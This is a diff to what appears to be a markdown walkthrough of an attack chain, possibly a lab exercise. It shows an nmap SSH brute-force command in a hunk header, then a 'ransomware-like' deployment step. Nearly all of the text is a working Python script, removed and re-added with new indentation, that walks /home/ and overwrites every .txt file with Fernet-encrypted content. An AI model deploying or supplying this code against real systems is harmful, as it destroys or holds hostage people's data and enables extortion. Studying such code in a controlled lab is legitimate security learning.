@@ -48,41 +48,38 @@ nmap --script ssh-brute --script-args userdb=username.txt,passdb=passwords.txt -
 
 ##  Step 4:Deploy and execute a ransomware-like script
 
-ransomware script : 
-
-
-  GNU nano 8.4                     
+ransomware script :                    
   
-from cryptography.fernet import Fernet
-import os
-
-# Change to the target directory
-os.chdir("/home/")
-
-# Generate and save a Fernet key (only once, or reuse an existing one)
-key = Fernet.generate_key()
-with open("key.key", "wb") as f:
-    f.write(key)
-
-# Initialize Fernet with the key
-fernet = Fernet(key)
-
-# Walk through the directory and encrypt all .txt files
-for root, dirs, files in os.walk(os.getcwd()):
-    for file in files:
-        if file.endswith(".txt"):
-            file_path = os.path.join(root, file)
-            
-            # Read original content
-            with open(file_path, "rb") as f:
-                data = f.read()
-            
-            # Encrypt the content
-            encrypted = fernet.encrypt(data)
-            
-            # Overwrite the file with encrypted content
-            with open(file_path, "wb") as f:
-                f.write(encrypted)
+    from cryptography.fernet import Fernet
+    import os
+    
+    # Change to the target directory
+    os.chdir("/home/")
+    
+    # Generate and save a Fernet key (only once, or reuse an existing one)
+    key = Fernet.generate_key()
+    with open("key.key", "wb") as f:
+        f.write(key)
+    
+    # Initialize Fernet with the key
+    fernet = Fernet(key)
+    
+    # Walk through the directory and encrypt all .txt files
+    for root, dirs, files in os.walk(os.getcwd()):
+        for file in files:
+            if file.endswith(".txt"):
+                file_path = os.path.join(root, file)
+                
+                # Read original content
+                with open(file_path, "rb") as f:
+                    data = f.read()
+                
+                # Encrypt the content
+                encrypted = fernet.encrypt(data)
+                
+                # Overwrite the file with encrypted content
+                with open(file_path, "wb") as f:
+                    f.write(encrypted)
 
 
  
